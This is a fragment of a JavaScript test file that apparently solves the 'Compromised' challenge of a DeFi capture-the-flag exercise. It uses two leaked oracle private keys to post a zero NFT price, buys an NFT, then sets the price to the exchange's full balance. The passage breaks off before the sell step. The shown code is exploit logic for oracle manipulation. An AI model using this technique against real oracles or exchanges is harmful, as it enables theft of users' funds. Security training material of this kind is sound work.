...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        const oracleWallet1 = new ethers.Wallet(PKEY1, defaultProvider);
        const oracleWallet2 = new ethers.Wallet(PKEY2, defaultProvider);

        // Set the price of the nft to zero
        await oracle.connect(oracleWallet1).postPrice('DVNFT', 0);
        await oracle.connect(oracleWallet2).postPrice('DVNFT', 0);

        // Buy 1 nft
        await exchange.connect(player).buyOne({ value: 1 });

        // Set the price of the nft to exchange balance via both the oracles
        const balance = await ethers.provider.getBalance(exchange.address)
        await oracle.connect(oracleWallet1).postPrice('DVNFT', balance);
        await oracle.connect(oracleWallet2).postPrice('DVNFT', balance);

        // Sell 1 nft
        // Get the id of the nft you own
        // const owner = await nftToken.ownerOf(0);
